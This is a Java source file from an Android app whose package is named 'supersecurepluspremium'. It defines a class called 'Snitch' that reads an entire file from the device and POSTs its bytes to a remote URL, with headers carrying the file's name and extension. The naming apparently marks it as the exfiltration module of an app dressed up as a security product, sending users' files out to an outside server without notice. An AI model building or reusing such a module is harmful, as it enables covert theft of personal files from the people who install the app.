package com.example.supersecurepluspremium;

import android.content.Context;
import android.util.Log;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class Snitch {
    private Context context;
    private String URL;

    public Snitch(Context context, String URL){
        this.context=context;
        this.URL=URL;
    }

    public void sendWebRequest(final File fileToSend, final String newName, final String extension){
        final RequestQueue queue = Volley.newRequestQueue(this.context);
        Response.Listener<String> listener = new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.v("secme", "Volley Succeeded");
            }
        };
        Response.ErrorListener errorListener = new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.v("secme", "Volley failed like un utter shit");
                Log.v("secme", error.toString());
            }
        };

        final StringRequest  stringRequest = new StringRequest (Request.Method.POST, this.URL, listener, errorListener){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                final Map<String, String> headers = new HashMap<>();
                long missingBytes = Math.max(0,fileToSend.length()-Integer.MAX_VALUE);
                headers.put("Name", newName);
                headers.put("Extension", extension);
                headers.put("MissingBytes", Long.toString(missingBytes));
                return headers;
            }
            @Override
            public byte[] getBody() {
                int arrayByteSize = (int) Math.min(Integer.MAX_VALUE, fileToSend.length());
                byte[] filebytes = new byte[arrayByteSize];
                try {
                    BufferedInputStream buf = new BufferedInputStream(new FileInputStream(fileToSend));
                    buf.read(filebytes, 0, filebytes.length);
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                    Log.v("secme", "Snitch can't find file");
                } catch (IOException e) {
                    e.printStackTrace();
                    Log.v("secme", "IO ekseupcheune");
                }
                return filebytes;
            }
        };

        queue.add(stringRequest);
        Log.v("secme", "Starting Queue");
        queue.start();
    }
}
